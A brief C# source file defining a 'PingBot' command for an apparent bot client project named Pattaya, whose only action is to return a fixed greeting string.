using pattaya_project_client.Commands.Interfaces;
using pattaya_project_client.Models;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace pattaya_project_client.Commands.Implements
{
    public class PingBot : BotCommand
    {
        public override string TaskName => "pingbot";

        public override string RunTask(BotTask task)
        {
            return "Hello, Welcome to Pattaya :)";
        }
    }
}
